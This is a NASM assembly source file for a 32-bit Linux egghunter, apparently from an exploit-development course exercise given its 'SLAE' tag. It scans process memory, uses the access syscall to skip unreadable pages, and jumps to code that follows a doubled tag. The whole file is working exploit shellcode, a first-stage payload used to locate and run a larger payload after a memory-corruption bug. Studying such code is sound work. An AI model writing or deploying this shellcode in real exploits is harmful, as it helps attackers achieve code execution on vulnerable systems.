; egghunter.nasm
;  - Search memory for tag, then pass over execution

global _start

section .text
_start:

	; int access(const char *pathname, int mode)
	; eax = 0x21 (access)
	; ebx = [edx +4]
	; ecx = 0x0

page:
	or dx, 0xfff		; increment page

search:
	inc edx			; increment
	xor eax, eax
	mov al, 0x21		; access, 33
	lea ebx, [edx +4]	; pathname
	xor ecx, ecx		; mode
	int 0x80		; execute
		
	cmp al, 0xf2
	je page			; is accessible?

	mov eax, 0x45414c53	; tag, SLAE
	mov edi, edx
	scasd			; compare to tag
	jne search
	scasd			; compare to tag
	jne search

	jmp edi			; found!

